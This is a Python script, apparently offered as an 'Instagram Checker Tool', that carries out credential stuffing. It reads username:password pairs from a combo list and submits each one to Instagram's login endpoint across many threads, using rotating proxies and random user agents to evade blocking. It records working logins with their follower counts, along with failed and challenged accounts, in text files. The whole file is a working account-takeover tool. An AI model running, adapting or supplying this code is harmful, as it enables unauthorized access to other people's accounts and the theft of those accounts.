import requests
import json
from datetime import datetime
from colorama import init,Fore,Style
from os import name,system
from sys import stdout
from random import choice
from threading import Thread,Lock,active_count
from fake_useragent import UserAgent
from time import sleep
from sys import stdout

class Main:
    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title_name:str):
        system("title {0}".format(title_name))

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def ReadFile(self,filename,method):
        with open(filename,method) as f:
            content = [line.strip('\n') for line in f]
            return content

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('proxies.txt','r')
        proxies = {}
        if self.proxy_type == 1:
            proxies = {
                "http":"http://{0}".format(choice(proxies_file)),
                "https":"https://{0}".format(choice(proxies_file))
            }
        elif self.proxy_type == 2:
            proxies = {
                "http":"socks4://{0}".format(choice(proxies_file)),
                "https":"socks4://{0}".format(choice(proxies_file))
            }
        else:
            proxies = {
                "http":"socks5://{0}".format(choice(proxies_file)),
                "https":"socks5://{0}".format(choice(proxies_file))
            }
        return proxies

    def TitleUpdate(self):
        while True:
            self.SetTitle('One Man Builds Instagram Checker Tool ^| HITS: {0} ^| CHALLENGES: {1} ^| BADS: {2} ^| RETRIES: {3} ^| THREADS: {4}'.format(self.hits,self.challenges,self.bads,self.retries,active_count()-1))
            sleep(0.1)

    def __init__(self):
        init(convert=True)
        self.clear()
        self.SetTitle('One Man Builds Instagram Checker Tool')
        self.title = Style.BRIGHT+Fore.RED+"""                                        
                            _____ _   _  _____ _____ ___  _____ ______  ___  ___  ___
                           |_   _| \ | |/  ___|_   _/ _ \|  __ \| ___ \/ _ \ |  \/  |
                             | | |  \| |\ `--.  | |/ /_\ \ |  \/| |_/ / /_\ \| .  . |
                             | | | . ` | `--. \ | ||  _  | | __ |    /|  _  || |\/| |
                            _| |_| |\  |/\__/ / | || | | | |_\ \| |\ \| | | || |  | |
                            \___/\_| \_/\____/  \_/\_| |_/\____/\_| \_\_| |_/\_|  |_/
                                                                                    
                                                                                    
                                  _____  _   _  _____ _____  _   __ ___________            
                                 /  __ \| | | ||  ___/  __ \| | / /|  ___| ___ \           
                                 | /  \/| |_| || |__ | /  \/| |/ / | |__ | |_/ /           
                                 | |    |  _  ||  __|| |    |    \ |  __||    /            
                                 | \__/\| | | || |___| \__/\| |\  \| |___| |\ \            
                                  \____/\_| |_/\____/ \____/\_| \_/\____/\_| \_|           
                                                                                    
                                                                                    
        """
        print(self.title)
        self.hits = 0
        self.challenges = 0
        self.bads = 0
        self.retries = 0
        self.ua = UserAgent()
        self.lock = Lock()

        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
        
        if self.use_proxy == 1:
            self.proxy_type = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Https ['+Fore.RED+'2'+Fore.CYAN+']Socks4 ['+Fore.RED+'3'+Fore.CYAN+']Socks5: '))
        
        self.threads_num = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))

        print('')

    def GetInstaFollowersNum(self,username):
        response = requests.get('https://www.instagram.com/{0}/?__a=1'.format(username)).text
        json_data = json.loads(response)
        if 'graphql' in json_data:
            return json_data['graphql']['user']['edge_followed_by']['count']
        else:
            return 'CANNOT GET FOLLOWERS NUM'

    def InstagramCheck(self,username,password):
        try:
            session = requests.session()

            link = 'https://www.instagram.com/accounts/login/'
            
            curtime = int(datetime.now().timestamp())

            headers = {
                'cookie': 'ig_cb=1'
            }

            response = session.get(link,headers=headers)
            csrf = response.cookies['csrftoken']

            auth_link = 'https://www.instagram.com/accounts/login/ajax/'

            payload = {
                'username': username,
                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{0}:{1}'.format(curtime,password),
                'queryParams': {},
                'optIntoOneTap': 'false'
            }

            headers = {
                "User-Agent": self.ua.random,
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            }

            response = ''

            if self.use_proxy == 1:
                response = session.post(auth_link,headers=headers,data=payload,proxies=self.GetRandomProxy())
            else:
                response = session.post(auth_link,headers=headers,data=payload)

            json_data = json.loads(response.text)
            if 'authenticated' in response.text:
                if json_data['authenticated'] == True:
                    followers = self.GetInstaFollowersNum(username)
                    self.PrintText(Fore.CYAN,Fore.RED,'HIT',f"{username}:{password} | FOLLOWERS: {followers}")
                    with open('hits.txt','a',encoding='utf8') as f:
                        f.write('{0}:{1} | FOLLOWERS: {2}\n'.format(username,password,followers))
                    self.hits = self.hits+1
                elif json_data['authenticated'] == False:
                    self.PrintText(Fore.RED,Fore.CYAN,'BAD',f"{username}:{password}")
                    with open('bads.txt','a',encoding='utf8') as f:
                        f.write('{0}:{1}\n'.format(username,password))
                    self.bads = self.bads+1
                else:
                    self.retries = self.retries+1
                    self.InstagramCheck(username,password)
            elif 'checkpoint_required' in response.text:
                self.PrintText(Fore.CYAN,Fore.RED,'CHALLENGE',f"{username}:{password}")
                with open('challenges.txt','a',encoding='utf8') as f:
                    f.write('{0}:{1}\n'.format(username,password))
                self.challenges = self.challenges+1
            else:
                self.retries = self.retries+1
                self.InstagramCheck(username,password)
        except Exception as e:
            self.retries = self.retries+1
            self.InstagramCheck(username,password)

    def Start(self):
        Thread(target=self.TitleUpdate).start()
        combos = self.ReadFile('combos.txt','r')
        for combo in combos:
            Run = True
            username = combo.split(':')[0]
            password = combo.split(':')[-1]

            if active_count()<=self.threads_num:
                Thread(target=self.InstagramCheck,args=(username,password)).start()
                Run = False

if __name__ == '__main__':
    main = Main()
    main.Start()